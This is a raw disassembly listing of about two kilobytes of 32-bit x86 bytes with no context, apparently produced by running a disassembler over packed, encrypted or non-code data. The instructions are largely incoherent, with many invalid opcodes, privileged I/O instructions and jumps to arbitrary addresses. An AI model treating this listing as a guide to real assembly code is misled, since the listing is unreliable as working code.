  422e81:	push   0xffffffd5
  422e83:	cmp    dl,BYTE PTR cs:[eax-0x1ab8682]
  422e8a:	clc    
  422e8b:	sti    
  422e8c:	int3   
  422e8d:	icebp  
  422e8e:	push   0x7e26b0dc
  422e93:	(bad)  
  422e94:	xchg   ebx,eax
  422e95:	or     ebx,DWORD PTR [ebx]
  422e97:	sbb    al,0x7e
  422e99:	loopne 0x422f08
  422e9b:	aam    0x18
  422e9d:	pop    ebp
  422e9e:	aaa    
  422e9f:	(bad)  
  422ea0:	lock sub eax,0xd97a9564
  422ea6:	xchg   esi,eax
  422ea7:	add    esi,ebp
  422ea9:	iret   
  422eaa:	ja     0x422ed7
  422eac:	daa    
  422ead:	mov    esi,ebx
  422eaf:	shr    BYTE PTR [edx-0x5508a0ea],1
  422eb5:	push   ebx
  422eb6:	outs   dx,BYTE PTR ds:[esi]
  422eb7:	mov    esp,0x3ae2179a
  422ebc:	dec    eax
  422ebd:	xchg   DWORD PTR cs:[edi+0x6f],esi
  422ec1:	(bad)  
  422ec2:	retf   0x52f0
  422ec5:	and    dh,BYTE PTR [esi+0x65]
  422ec8:	rol    DWORD PTR [ebx],0xc
  422ecb:	sbb    ah,BYTE PTR [edi+eiz*8-0x5dd53e1]
  422ed2:	shl    cl,0x17
  422ed5:	test   eax,0x40c9728d
  422eda:	pop    ds
  422edb:	pop    edi
  422edc:	or     ah,dl
  422ede:	mov    esp,0x4b334adf
  422ee3:	and    DWORD PTR [ebp+edi*4-0x86071dd],esi
  422eea:	popa   
  422eeb:	inc    esp
  422eec:	sbb    BYTE PTR [ecx],ah
  422eee:	mov    esi,0x76be5e95
  422ef3:	ret    0x842f
  422ef6:	(bad)  
  422ef7:	cs jg  0x422f1d
  422efa:	pop    ds
  422efb:	xchg   BYTE PTR [ebp-0x38],ah
  422efe:	out    dx,al
  422eff:	test   BYTE PTR [esi],ah
  422f01:	inc    ebx
  422f02:	(bad)  
  422f03:	and    bl,BYTE PTR [ebp-0x1c]
  422f06:	and    eax,0x99040d1c
  422f0b:	sub    dl,BYTE PTR [eax-0x4697638d]
  422f11:	fs and eax,0x835a521d
  422f17:	iret   
  422f18:	adc    al,ch
  422f1a:	test   BYTE PTR [ecx+ebp*4+0x4d],ah
  422f1e:	fs pusha 
  422f20:	mov    ds:0x4c634906,eax
  422f25:	xlat   BYTE PTR ds:[ebx]
  422f26:	ror    ebp,1
  422f28:	pop    eax
  422f29:	dec    ebp
  422f2a:	jg     0x422f23
  422f2c:	in     eax,0xd4
  422f2e:	dec    ebp
  422f2f:	in     al,dx
  422f30:	adc    esp,DWORD PTR [edi-0x2f]
  422f33:	mov    edx,0x23ca55c8
  422f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f39:	and    ebx,DWORD PTR [ebp+ebx*8+0x69de79aa]
  422f40:	retf   0xe0c5
  422f43:	mov    edi,eax
  422f45:	ins    DWORD PTR es:[edi],dx
  422f46:	mov    edi,0x48c421e0
  422f4b:	fs ss pop esp
  422f4e:	loope  0x422efc
  422f50:	add    eax,0x319f3603
  422f55:	fstp   TBYTE PTR [esi]
  422f57:	jbe    0x422f2d
  422f59:	(bad)  
  422f5a:	add    BYTE PTR [esi],ah
  422f5c:	push   ds
  422f5d:	push   ebp
  422f5f:	popa   
  422f60:	inc    eax
  422f61:	or     al,0x17
  422f63:	push   ecx
  422f64:	ret    0x3b5e
  422f67:	into   
  422f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f69:	imul   edi
  422f6b:	inc    esp
  422f6c:	mov    edi,0xf002c30b
  422f71:	mov    al,ds:0xe5fbacfb
  422f76:	inc    esi
  422f77:	dec    eax
  422f78:	inc    eax
  422f79:	sbb    BYTE PTR [ebx-0x56],ch
  422f7c:	dec    edi
  422f7d:	jns    0x422f77
  422f7f:	call   0x6bbef974
  422f84:	or     ecx,ebp
  422f86:	jecxz  0x422f1f
  422f88:	data16 sbb BYTE PTR [ebx+0x4088c86a],bh
  422f8f:	inc    esp
  422f90:	inc    ebp
  422f91:	mov    ah,0xa5
  422f93:	test   eax,0xb31f41d1
  422f98:	sahf   
  422f99:	mov    bl,0x3
  422f9b:	or     BYTE PTR [ecx],bl
  422f9d:	clc    
  422f9e:	shl    ecx,cl
  422fa0:	fldenv [ebp+0x7b]
  422fa3:	sub    eax,0x6d052eff
  422fa8:	in     al,0xaa
  422faa:	xchg   BYTE PTR [edi+0x4e31bc18],dl
  422fb0:	sti    
  422fb1:	(bad)  
  422fb2:	cld    
  422fb3:	jnp    0x422f89
  422fb5:	xor    esi,DWORD PTR [edx-0x6a]
  422fb8:	or     al,0x5
  422fba:	ret    
  422fbb:	sar    DWORD PTR [esi-0x6d0412d],cl
  422fc1:	add    al,0x37
  422fc3:	repnz inc edx
  422fc5:	cmp    BYTE PTR cs:[eiz*4+0x4d213d60],cl
  422fcd:	jnp    0x423032
  422fcf:	xchg   ebx,eax
  422fd0:	and    ecx,0xffffffa1
  422fd3:	inc    esp
  422fd4:	cmp    eax,0x4ba8e329
  422fd9:	loopne 0x422fb5
  422fdb:	mov    esi,0xdb8ee968
  422fe0:	jle    0x422f65
  422fe2:	lahf   
  422fe3:	xchg   edi,eax
  422fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fe5:	sub    esi,DWORD PTR [ecx+eiz*4]
  422fe8:	mov    edi,0x968a8dc3
  422fed:	rcl    esi,cl
  422fef:	cdq    
  422ff0:	xchg   ecx,eax
  422ff1:	fnstsw WORD PTR [bx+si]
  422ff4:	xchg   edi,eax
  422ff5:	cmp    BYTE PTR [edi+0x6e],cl
  422ff8:	mov    ebx,0x388a684c
  422ffd:	jp     0x422fb4
  422fff:	mov    cl,0x4b
  423001:	push   es
  423002:	rcr    DWORD PTR [ebx-0x2eabebdf],0x8b
  423009:	mov    esp,0x31f39b07
  42300e:	cwde   
  42300f:	pop    ecx
  423010:	aas    
  423011:	mov    edx,0xfbdf89c2
  423016:	fdivr  DWORD PTR [eax-0xcb975ed]
  42301c:	and    ebp,esi
  42301e:	loopne 0x422fec
  423020:	sbb    BYTE PTR [eax+0x7f1edce9],0x54
  423027:	add    DWORD PTR [edx-0x4],eax
  42302a:	mov    ds:0x30c811f8,al
  42302f:	xchg   ebx,eax
  423030:	or     bh,BYTE PTR ds:0x389230ff
  423036:	pop    ss
  423037:	inc    ebp
  423038:	xlat   BYTE PTR ds:[ebx]
  423039:	sbb    BYTE PTR [esi-0x7024e98e],ch
  42303f:	pop    ebx
  423040:	call   0x1e2f:0x45906a7a
  423047:	jecxz  0x423038
  423049:	outs   dx,DWORD PTR ds:[esi]
  42304a:	out    dx,al
  42304b:	ret    0xa707
  42304e:	push   edi
  42304f:	adc    esi,edi
  423051:	nop
  423052:	fcomip st,st(6)
  423054:	dec    edi
  423055:	pushf  
  423056:	jmp    DWORD PTR [ecx-0x7f9859b]
  42305c:	mov    cs,WORD PTR [edx-0x34]
  42305f:	mov    ah,0x29
  423061:	aas    
  423062:	mov    ecx,0xfbfdfd40
  423067:	xor    BYTE PTR [edx+0x43],bh
  42306a:	xor    DWORD PTR [ebp+0x66050ada],edi
  423070:	sub    DWORD PTR cs:[ebx+0x52154555],edx
  423077:	ficomp WORD PTR [edx+eax*8-0x7d]
  42307b:	sub    al,0x19
  42307d:	lock add DWORD PTR [edi-0x58752dee],esi
  423084:	jmp    0x9c4c:0x13540135
  42308b:	jb     0x4230ef
  42308d:	add    DWORD PTR [eax],edx
  42308f:	lahf   
  423090:	sub    ebp,eax
  423092:	jle    0x423057
  423094:	push   esp
  423095:	mov    esi,eax
  423097:	bound  eax,QWORD PTR [edi+0x12000000]
  42309d:	fsub   DWORD PTR [ebx+0x72]
  4230a0:	jmp    0x42309d
  4230a2:	adc    edi,eax
  4230a4:	sub    edi,DWORD PTR [ebx-0x307a7709]
  4230aa:	and    cl,ah
  4230ac:	or     DWORD PTR [ebx+0x2850001],ebp
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	ins    DWORD PTR es:[edi],dx
  4230b5:	push   cs
  4230b6:	push   ss
  4230b7:	sbb    bh,BYTE PTR [esi+0x129d3fcb]
  4230bd:	mov    al,0xb5
  4230bf:	dec    edx
  4230c0:	mov    eax,ds:0xc846db42
  4230c5:	xchg   DWORD PTR [ebx+0x39],esi
  4230c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230c9:	(bad)  [edx-0x393b2f86]
  4230cf:	xchg   ebp,eax
  4230d0:	cwde   
  4230d1:	les    eax,FWORD PTR [esi+0x7a]
  4230d4:	pop    esi
  4230d5:	(bad)  
  4230d6:	in     al,0x1
  4230d8:	es pop esi
  4230da:	jp     0x423112
  4230dc:	jne    0x423094
  4230de:	dec    edx
  4230df:	in     eax,0x41
  4230e1:	(bad)  
  4230e2:	hlt    
  4230e3:	int    0x3b
  4230e5:	popf   
  4230e6:	(bad)  
  4230e7:	jmp    0xc0ee7e6
  4230ec:	add    BYTE PTR [eax],dl
  4230ee:	outs   dx,BYTE PTR ds:[esi]
  4230ef:	enter  0x3b72,0xfb
  4230f3:	xchg   edi,eax
  4230f4:	dec    edx
  4230f5:	test   al,0xc
  4230f7:	and    DWORD PTR [edi-0xdd3af0b],eax
  4230fd:	rcr    DWORD PTR [ebx+0x41],cl
  423100:	sub    eax,0xbf96f012
  423105:	leave  
  423106:	mov    bl,0x21
  423108:	lods   eax,DWORD PTR ds:[esi]
  423109:	je     0x4230e8
  42310b:	in     al,dx
  42310c:	data16 arpl WORD PTR [edx+ebx*2+0x51fa69bc],dx
  423114:	jnp    0x423138
  423116:	popa   
  423117:	fcmovnbe st,st(4)
  423119:	sbb    bl,BYTE PTR [ecx-0x68c74b9a]
  42311f:	xlat   BYTE PTR ds:[ebx]
  423120:	jne    0x4230f1
  423122:	jae    0x4230fb
  423124:	dec    esp
  423125:	xchg   BYTE PTR [eax],bh
  423127:	jmp    0x4230e1
  423129:	inc    ebx
  42312a:	popf   
  42312b:	mov    BYTE PTR [edi-0x7f],0xbc
  42312f:	retf   
  423130:	ins    DWORD PTR es:[edi],dx
  423131:	mov    ecx,DWORD PTR [ecx-0x68ff06da]
  423137:	jnp    0x4230f0
  423139:	push   ecx
  42313a:	jno    0x423140
  42313c:	xor    BYTE PTR [edi-0xe9c88de],dh
  423142:	jecxz  0x42317a
  423144:	sbb    ebp,DWORD PTR [edi-0xe926cad]
  42314a:	mov    al,0x8f
  42314c:	in     al,0xd5
  42314e:	mov    WORD PTR [esi-0x49afaa20],cs
  423154:	sbb    BYTE PTR [ebx+0x20],bh
  423157:	test   eax,0xc7d1b343
  42315c:	xor    eax,0x18da3776
  423161:	cld    
  423162:	dec    BYTE PTR [ebx]
  423164:	(bad)  
  423165:	push   ebx
  423166:	jnp    0x4231bc
  423168:	and    eax,0x784b4ba7
  42316d:	adc    eax,0x8be79dca
  423172:	aas    
  423173:	xchg   BYTE PTR [ebx+0x55],cl
  423176:	jae    0x42311b
  423178:	stos   BYTE PTR es:[edi],al
  423179:	jg     0x4231a8
  42317b:	jge    0x42314d
  42317d:	push   esp
  42317e:	fnstcw WORD PTR [ecx+0x254d5262]
  423184:	popf   
  423185:	and    edi,eax
  423187:	sub    ch,dl
  423189:	outs   dx,DWORD PTR ds:[esi]
  42318a:	jmp    0x1913:0x38e9946e
  423191:	pushf  
  423192:	mov    ch,0x3b
  423194:	xor    eax,0x7184316
  423199:	push   ecx
  42319a:	sbb    cl,BYTE PTR [ebp+0x6e]
  42319d:	xchg   edx,eax
  42319e:	mov    dl,ah
  4231a0:	js     0x4231ca
  4231a2:	dec    ebp
  4231a3:	(bad)  
  4231a4:	(bad)  
  4231a5:	xchg   ebp,eax
  4231a6:	fwait
  4231a7:	mov    DWORD PTR [ecx+0x1d],esp
  4231aa:	push   0x70
  4231ac:	mov    bl,0x8f
  4231ae:	std    
  4231af:	lea    eax,[ebp+0x38aec181]
  4231b5:	outs   dx,DWORD PTR ds:[esi]
  4231b6:	dec    ebp
  4231b7:	sub    DWORD PTR [ebx],ebx
  4231b9:	or     al,0xc9
  4231bb:	test   al,0x87
  4231bd:	shld   DWORD PTR [ecx],edi,cl
  4231c0:	sbb    eax,0xb77fc696
  4231c5:	(bad)  
  4231c6:	dec    ecx
  4231c7:	and    ebx,DWORD PTR [ebp+0x25]
  4231ca:	jmp    0x423196
  4231cc:	push   ebx
  4231cd:	pop    ds
  4231ce:	stos   BYTE PTR es:[edi],al
  4231cf:	inc    edi
  4231d0:	mov    ch,0x6a
  4231d2:	pop    es
  4231d3:	enter  0x55ea,0x81
  4231d7:	shl    DWORD PTR [ecx+ebx*2-0x2b],1
  4231db:	sti    
  4231dc:	adc    esi,edx
  4231de:	xor    eax,0x8ddc1922
  4231e3:	jne    0x423235
  4231e5:	and    ebx,DWORD PTR [edi+0x6d]
  4231e8:	sub    eax,0xbd19b6f5
  4231ed:	call   0xa146:0x12ca944c
  4231f4:	sbb    BYTE PTR [esi+0x1ac189de],0x48
  4231fb:	jecxz  0x423230
  4231fd:	jg     0x4231f9
  4231ff:	sub    eax,0x5068a773
  423204:	pop    ds
  423205:	lods   eax,DWORD PTR ds:[esi]
  423206:	sbb    ebp,DWORD PTR [eax+ebx*8+0x4c]
  42320a:	in     eax,0x47
  42320c:	mov    ecx,0xec692f87
  423211:	pop    ebp
  423212:	lds    ebx,FWORD PTR [ebp-0x63950a54]
  423218:	cli    
  423219:	mov    cl,0x3e
  42321b:	pop    esi
  42321c:	ins    DWORD PTR es:[edi],dx
  42321d:	(bad)  
  42321f:	fsub   st,st(6)
  423221:	addr16 adc ecx,edi
  423224:	jno    0x4231b1
  423226:	js     0x423268
  423228:	mov    edx,0xcd892c3e
  42322d:	(bad)  
  42322f:	mov    edi,DWORD PTR ds:0x71874293
  423235:	fsub   st,st(4)
  423237:	dec    BYTE PTR [ebx]
  423239:	jbe    0x423240
  42323b:	sub    DWORD PTR [ebp+0x29],edx
  42323e:	jmp    FWORD PTR [bp+di+0x50]
  423242:	mov    ds:0xe2dbc15f,eax
  423247:	pop    eax
  423248:	add    al,0x11
  42324a:	mov    eax,0xf043dcc
  42324f:	xchg   esp,esp
  423251:	inc    ebx
  423252:	cmp    al,0xeb
  423254:	sahf   
  423255:	sub    BYTE PTR [eax-0x7ad31d94],ah
  42325b:	cld    
  42325c:	xor    BYTE PTR [ebx-0x3562866e],dh
  423262:	call   0x9b7107e
  423267:	mov    eax,0xe0ae09f1
  42326c:	dec    esi
  42326d:	mov    BYTE PTR [ecx],ah
  42326f:	fidiv  WORD PTR [ebx+0x29d8ee6c]
  423275:	inc    eax
  423276:	or     DWORD PTR [ecx-0x66],ecx
  423279:	repnz xor al,0x22
  42327c:	lods   eax,DWORD PTR ds:[esi]
  42327d:	and    al,0xee
  42327f:	jp     0x42324d
  423281:	out    dx,eax
  423282:	or     esp,DWORD PTR [edx+0x79dee3cf]
  423288:	dec    ecx
  423289:	and    cl,BYTE PTR [edi-0x3b34f84b]
  42328f:	pushf  
  423290:	(bad)  
  423291:	jae    0x4232cd
  423293:	shl    BYTE PTR [edi+0x16],cl
  423296:	es pop ds
  423298:	stos   DWORD PTR es:[edi],eax
  423299:	lods   eax,DWORD PTR ds:[esi]
  42329a:	aas    
  42329b:	retf   
  42329c:	fcom   DWORD PTR [eax+eiz*1+0x17f8ef60]
  4232a3:	ds jmp 0x84f343d5
  4232a9:	adc    BYTE PTR [ebp-0x1bcfba1b],ah
  4232af:	test   al,0x20
  4232b1:	adc    DWORD PTR [esp+eax*1-0x34],esi
  4232b5:	mov    esi,0xd9ea7e7f
  4232ba:	xchg   esp,eax
  4232bb:	test   eax,0x4aeb1378
  4232c0:	jecxz  0x4232ce
  4232c2:	mov    ebp,0xeec8b87f
  4232c7:	pop    edx
  4232c8:	test   eax,0x8dbb4d2
  4232cd:	mov    al,0x26
  4232cf:	jecxz  0x423259
  4232d1:	adc    BYTE PTR [edi+ecx*8-0x25],ah
  4232d5:	mov    dl,0xb0
  4232d7:	rol    ah,0x99
  4232da:	pop    esi
  4232db:	xor    ch,BYTE PTR [ecx-0x50]
  4232de:	(bad)  
  4232df:	mov    BYTE PTR [edi-0x20220035],cl
  4232e5:	mov    dh,0x7a
  4232e7:	repz cmp eax,0x248c2b2a
  4232ed:	cdq    
  4232ee:	or     DWORD PTR [ebx-0x1c1da4bf],0x16a074ae
  4232f8:	push   0xffffffe8
  4232fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232fb:	rcl    DWORD PTR [esi],cl
  4232fd:	fmul   st(1),st
  4232ff:	repz das 
  423301:	repz icebp 
  423303:	and    BYTE PTR [ebx-0x45],ah
  423306:	sbb    al,0xd5
  423308:	cs lahf 
  42330a:	dec    ebp
  42330b:	std    
  42330c:	xchg   BYTE PTR [ecx+0x2a31c479],dl
  423312:	mov    bh,0x11
  423314:	adc    al,0x83
  423316:	out    dx,al
  423317:	push   0xe
  423319:	pop    es
  42331a:	sub    DWORD PTR [ebx+ebp*1],0x3139b880
  423321:	mov    edi,0x2d2230d0
  423326:	shl    BYTE PTR [esi-0x68],1
  423329:	mov    esi,0xdeee6688
  42332e:	scas   al,BYTE PTR es:[edi]
  42332f:	jmp    0xf3a:0x7ed6e400
  423336:	mov    bh,0x8c
  423338:	pop    es
  423339:	add    BYTE PTR [eax],al
  42333b:	add    BYTE PTR [esi],cl
  42333d:	and    BYTE PTR [eax-0x404051c1],cl
  423343:	xor    DWORD PTR [ebx+0x469289bd],edx
  423349:	pop    es
  42334a:	and    eax,0x1ad8eae
  42334f:	add    BYTE PTR [ebp+0x14000002],al
  423355:	leave  
  423356:	mov    WORD PTR [edx+0x1ebeb11d],es
  42335c:	or     al,0xb1
  42335e:	mov    ebp,0x58015f2c
  423363:	mov    ebp,0xc4aad1c9
  423368:	cmp    eax,0xda705e07
  42336d:	aam    0x6
  42336f:	and    BYTE PTR [esi-0x19],al
  423372:	mov    al,BYTE PTR gs:[eax+0x7]
  423376:	or     dh,BYTE PTR [esi-0xfd1d656]
  42337c:	add    ebp,DWORD PTR [esi]
  42337e:	stos   DWORD PTR es:[edi],eax
  42337f:	jl     0x423353
  423381:	retf   0x6173
  423384:	sbb    eax,0xa6caa0fd
  423389:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42338b:	sub    ebp,ecx
  42338d:	inc    ebx
  42338e:	std    
  42338f:	daa    
  423390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423391:	push   0xffffffde
  423393:	and    ebp,DWORD PTR [esi-0x60]
  423396:	xchg   edi,eax
  423397:	loop   0x423363
  423399:	adc    bh,BYTE PTR [edx]
  42339b:	xor    eax,0xa93d74b8
  4233a0:	dec    eax
  4233a1:	jle    0x4233f0
  4233a3:	push   ebp
  4233a4:	imul   DWORD PTR [esi+0x161d205]
  4233aa:	push   ds
  4233ab:	add    eax,0x4026142
  4233b0:	stos   BYTE PTR es:[edi],al
  4233b1:	sahf   
  4233b2:	jmp    0x423345
  4233b4:	retf   0x2236
  4233b7:	jb     0x423357
  4233b9:	aas    
  4233ba:	cmp    eax,0x20543a41
  4233bf:	aam    0x6e
  4233c1:	cmp    al,0xb8
  4233c3:	adc    dl,0x73
  4233c6:	test   DWORD PTR [ecx-0x4b],0xdcdd82af
  4233cd:	xlat   BYTE PTR ds:[ebx]
  4233ce:	imul   ebp,DWORD PTR [esi+0x15e27ad9],0x70
  4233d5:	std    
  4233d6:	les    esi,FWORD PTR [eax]
  4233d8:	dec    eax
  4233d9:	or     al,0xd9
  4233db:	imul   ebx,DWORD PTR [ebx-0x2e],0x2e
  4233df:	pop    ebx
  4233e0:	cmp    al,0x99
  4233e2:	js     0x42336e
  4233e4:	dec    esi
  4233e5:	fldcw  WORD PTR [ecx-0x79]
  4233e8:	in     eax,dx
  4233e9:	xor    DWORD PTR [esi-0x7f],eax
  4233ec:	push   ebx
  4233ed:	xor    al,0xaa
  4233ef:	add    DWORD PTR [ecx],esi
  4233f1:	xchg   ebp,eax
  4233f2:	les    ebp,FWORD PTR [ebx-0x7badfbfe]
  4233f8:	add    DWORD PTR [esi+0x260c9343],edx
  4233fe:	outs   dx,DWORD PTR ds:[esi]
  4233ff:	imul   ecx,DWORD PTR [eax+0x46],0x5a20e2b
  423406:	sbb    eax,0xc7d19f99
  42340b:	lods   eax,DWORD PTR ds:[esi]
  42340c:	xchg   ebx,eax
  42340d:	or     DWORD PTR [esi],esp
  42340f:	mov    ah,0x89
  423411:	call   0xa1355c05
  423416:	cld    
  423417:	xor    al,0x77
  423419:	mov    ebp,0xdd6cbc4e
  42341e:	xchg   DWORD PTR [ebp+esi*4-0x1f],edi
  423422:	inc    esi
  423423:	dec    eax
  423424:	sbb    BYTE PTR [ecx+0x6efc5b62],bh
  42342a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42342c:	push   es
  42342d:	div    BYTE PTR [esi+0x5]
  423430:	ds sub al,bl
  423433:	inc    ebx
  423434:	bound  ecx,QWORD PTR [esi+0x33eb974d]
  42343a:	and    eax,0x59176ce3
  42343f:	sti    
  423440:	jae    0x423411
  423442:	aad    0xed
  423444:	push   DWORD PTR [ecx+0x4b]
  423447:	ds into 
  423449:	push   edx
  42344a:	sbb    ebx,esp
  42344c:	xor    esp,DWORD PTR [esi-0x332de20c]
  423452:	cmp    eax,DWORD PTR [ebx-0x586cd5ff]
  423458:	jecxz  0x4234bb
  42345a:	jl     0x4233e8
  42345c:	mov    cl,0xad
  42345e:	inc    edi
  42345f:	adc    eax,0x6f04cae6
  423464:	jp     0x423410
  423466:	inc    ebx
  423467:	lahf   
  423468:	and    eax,0xcc1e29b9
  42346d:	push   ss
  42346e:	lock push eax
  423470:	pop    ebp
  423471:	or     eax,0x560d88da
  423476:	push   cs
  423477:	mov    es,ebx
  423479:	push   ss
  42347a:	mov    ah,bl
  42347c:	mov    edx,0x951cfe35
  423481:	mov    ds:0x14db3eaa,eax
  423486:	dec    edx
  423487:	(bad)  
  423488:	call   0xdc14fe
  42348d:	xor    eax,DWORD PTR [ebp+ecx*1-0x76]
  423491:	mov    ah,0x14
  423493:	ret    0x6ec
  423496:	jmp    0x42346c
  423498:	retf   
  423499:	aad    0x63
  42349b:	inc    edx
  42349c:	mov    eax,ds:0x24223968
  4234a1:	jno    0x423466
  4234a3:	mov    DWORD PTR [eax+0x6d],eax
  4234a6:	xchg   edi,eax
  4234a7:	add    edi,ebp
  4234a9:	fstp   QWORD PTR [esp+ebp*8-0x6ee93776]
  4234b0:	fiadd  DWORD PTR [ebx+0x62]
  4234b3:	add    bl,BYTE PTR [edx]
  4234b5:	jge    0x423452
  4234b7:	ror    BYTE PTR [esp+ebx*2+0x4e],cl
  4234bb:	arpl   di,dx
  4234bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234be:	daa    
  4234bf:	jmp    0x423537
  4234c1:	arpl   WORD PTR [ecx-0x1e],si
  4234c4:	lahf   
  4234c5:	int3   
  4234c6:	sbb    esp,esp
  4234c8:	repnz adc al,0x3d
  4234cb:	xchg   edi,eax
  4234cc:	pop    edx
  4234cd:	aam    0xe1
  4234cf:	xor    ebx,DWORD PTR [ecx-0x23]
  4234d2:	mov    ebx,0x897ed083
  4234d7:	sub    eax,0x91c775e6
  4234dc:	daa    
  4234dd:	sbb    al,0xe0
  4234df:	sub    ch,BYTE PTR [ebp+0x3e]
  4234e2:	mov    dl,0x26
  4234e4:	adc    al,BYTE PTR [eax-0x29a03015]
  4234ea:	mov    cl,0x39
  4234ec:	mov    bl,0xa4
  4234ee:	test   eax,0x29cb8102
  4234f3:	pop    ecx
  4234f4:	test   BYTE PTR [ecx+0x188008a6],0x1f
  4234fb:	xor    ah,cl
  4234fd:	outs   dx,DWORD PTR ds:[esi]
  4234fe:	enter  0x5058,0xe1
  423502:	arpl   WORD PTR [edi],bp
  423504:	cdq    
  423505:	jmp    0x92c0:0x534b14c7
  42350c:	dec    ecx
  42350d:	imul   edi,ebp,0x3d40f2f2
  423513:	push   ebx
  423514:	pop    ss
  423515:	sub    al,BYTE PTR [eax]
  423517:	fidiv  DWORD PTR [ecx+0x5]
  42351a:	retf   0xa55f
  42351d:	icebp  
  42351e:	ss sbb eax,0x31be765d
  423524:	lahf   
  423525:	ja     0x423562
  423527:	sbb    bl,al
  423529:	jb     0x423587
  42352b:	inc    esi
  42352c:	loopne 0x423521
  42352e:	sbb    eax,0x67c1daef
  423533:	xchg   edi,eax
  423534:	jbe    0x42354e
  423536:	mov    WORD PTR [ebx+ecx*8],es
  423539:	xor    al,BYTE PTR [ebx-0x5e886b7]
  42353f:	clc    
  423540:	and    eax,0x8443143d
  423545:	bound  esp,QWORD PTR ds:0x289a17f3
  42354b:	sbb    BYTE PTR [eax+0x68c13cef],ah
  423551:	fld    DWORD PTR [esi+0x6f]
  423554:	jge    0x423529
  423556:	add    dl,ah
  423558:	dec    esi
  423559:	aam    0xc0
  42355b:	mov    al,ds:0x55882036
  423560:	test   DWORD PTR [edx],esp
  423562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423563:	and    al,0xb9
  423565:	cli    
  423566:	cmp    ebp,DWORD PTR [ecx-0xd]
  423569:	lea    eax,[ebp+0x2bb82b9c]
  42356f:	mov    dh,0x75
  423571:	push   cs
  423572:	rcr    BYTE PTR [ecx],cl
  423574:	mov    cl,0x47
  423576:	mov    al,ds:0x41c5a037
  42357b:	push   esp
  42357c:	add    eax,0x9bfe091a
  423581:	dec    ebx
  423582:	dec    esp
  423583:	js     0x423516
  423585:	scas   eax,DWORD PTR es:[edi]
  423586:	in     al,dx
  423587:	xchg   ebp,eax
  423588:	call   0xd10a:0x2823b021
  42358f:	adc    BYTE PTR [edi+0x4f],bh
  423592:	daa    
  423593:	mov    al,0xc3
  423595:	mov    ch,0xc9
  423597:	cmp    DWORD PTR [esi+ecx*2],eax
  42359a:	enter  0xfe3b,0x3f
  42359e:	test   al,0x40
  4235a0:	push   cs
  4235a1:	rcl    ecx,1
  4235a3:	push   cs
  4235a4:	mov    dl,bh
  4235a6:	cwde   
  4235a7:	mov    eax,ds:0x213b0b1
  4235ac:	jmp    0x42357e
  4235ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235af:	gs xchg ebp,eax
  4235b1:	pop    edx
  4235b2:	cmp    ecx,DWORD PTR [ebx]
  4235b4:	ins    DWORD PTR es:[edi],dx
  4235b5:	leave  
  4235b6:	test   al,0x85
  4235b8:	(bad)  
  4235b9:	clc    
  4235ba:	retf   
  4235bb:	and    eax,0x10958093
  4235c0:	add    BYTE PTR [ebp-0x4fad578f],ah
  4235c6:	dec    ebx
  4235c7:	mov    eax,ds:0xdb447e8b
  4235cc:	push   esp
  4235cd:	xchg   edx,eax
  4235ce:	je     0x4235eb
  4235d0:	dec    esp
  4235d1:	das    
  4235d2:	popf   
  4235d3:	ret    0x17c5
  4235d6:	mov    ah,0xae
  4235d8:	mov    WORD PTR [eax],es
  4235da:	add    BYTE PTR [eax],al
  4235dc:	pop    esp
  4235dd:	mov    edi,0xdce35063
  4235e2:	jg     0x4235a3
  4235e4:	popa   
  4235e5:	hlt    
  4235e6:	mov    esi,0x18fd761d
  4235eb:	int    0x13
  4235ed:	mov    al,0x1
  4235ef:	add    BYTE PTR [ebp+0x30000002],al
  4235f5:	cli    
  4235f6:	call   0xdda2:0xe5fd0166
  4235fd:	arpl   ax,di
  4235ff:	adc    ah,dh
  423601:	js     0x42359b
  423603:	dec    edx
  423604:	enter  0xf479,0x26
  423608:	out    dx,eax
  423609:	test   al,0x83
  42360b:	jge    0x423677
  42360d:	je     0x423631
  42360f:	sub    edx,DWORD PTR [ebx+0x6146ab0d]
  423615:	xchg   BYTE PTR [esi+0x1c41a007],ch
  42361b:	mov    cl,0x15
  42361d:	adc    eax,0x2bc3474c
  423622:	inc    eax
  423623:	mov    esp,0xb4bf427d
  423628:	cli    
  423629:	addr16 iret 
  42362b:	or     eax,0xa831a7e9
  423630:	jbe    0x423665
  423632:	mov    ecx,ecx
  423634:	pop    edx
  423635:	mov    dl,0x73
  423637:	out    dx,al
  423638:	sub    esi,DWORD PTR ds:0x67be55dd
  42363e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42363f:	cs xchg ecx,eax
  423641:	jl     0x423619
  423643:	dec    ecx
  423644:	cs mov edx,eax
  423647:	mov    ebx,edi
  423649:	xchg   ecx,eax
  42364a:	ins    BYTE PTR es:[edi],dx
  42364b:	mov    ch,0xd2
  42364d:	int3   
  42364e:	sbb    bl,ch
  423650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423651:	xor    BYTE PTR ds:0x6cc3098a,0xd1
  423658:	fwait
  423659:	pushf  
  42365a:	mov    ebp,DWORD PTR [edi+0x642b2853]
  423660:	das    
  423661:	idiv   ebx
  423663:	mov    eax,ds:0xe6d0fba9
  423668:	fldenv ds:0xb7d5abd5
  42366e:	jne    0x423655
  423670:	(bad)  
  423671:	icebp  
  423672:	sub    BYTE PTR [esi+0x1],al
  423675:	fisub  DWORD PTR [ebx+0x2a9b3ef4]
  42367b:	mov    edi,0x13e9613a
  423680:	and    cl,BYTE PTR [esi]
  423682:	into   
  423683:	lds    eax,FWORD PTR [eax+0x3]
  423686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423687:	sar    BYTE PTR [esp+ebp*2-0xc45be7e],1
  42368e:	arpl   WORD PTR [ebx+edx*1+0x7d],si
  423692:	retf   
  423693:	ror    ebx,cl
  423695:	int3   
  423696:	cwde   
  423697:	out    dx,eax
  423698:	repnz inc edx
  42369a:	pop    esp
  42369b:	push   DWORD PTR ds:0x1fdc9440
  4236a1:	std    
